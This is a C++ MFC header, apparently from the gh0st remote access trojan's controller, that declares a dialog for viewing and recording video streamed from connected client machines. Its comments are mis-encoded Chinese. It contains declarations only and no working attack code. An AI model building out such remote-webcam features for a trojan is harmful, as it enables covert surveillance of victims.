#pragma once


// CVideoDlg �Ի���
#include "include/IOCPServer.h"
#include "BmpToAvi.h"
#include "../Common/VideoCodec.h"
class CVideoDlg : public CDialog
{
	DECLARE_DYNAMIC(CVideoDlg)

public:
	CVideoDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // ��׼���캯��
	virtual ~CVideoDlg();

	// �Ի�������
	enum { IDD = IDD_VIDEODLG };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()

private:
	int	m_nOldWidth; // OnSizeʱ�ж��Ǹ߻�����仯��������
	UINT m_nCount;
	HICON m_hIcon;
	CVideoCodec	*m_pVideoCodec;
	DWORD m_fccHandler;
	CString m_aviFile; // ����ļ�����Ϊ�վ�д��

	CBmpToAvi	m_aviStream;       //�����Ҳ��gh0st��װ�õ��࣬���ǵ����书�ܾͿ�����
	HDC			m_hDC;
	HDRAWDIB	m_hDD;

	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	LPVOID m_lpScreenDIB;
	LPBYTE m_lpCompressDIB;
	MINMAXINFO m_MMI;
	LPBITMAPINFO m_lpbmi;
protected:
	void ResetScreen(void);
	void InitMMI(void);
public:
	afx_msg void OnClose();
	afx_msg void OnPaint();
	afx_msg void OnGetMinMaxInfo(MINMAXINFO* lpMMI);
	void OnReceiveComplete(void);
private:
	void DrawDIB(void);
public:
	virtual BOOL OnInitDialog();
	void InitCodec(DWORD fccHandler);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	void SaveAvi(void);
};
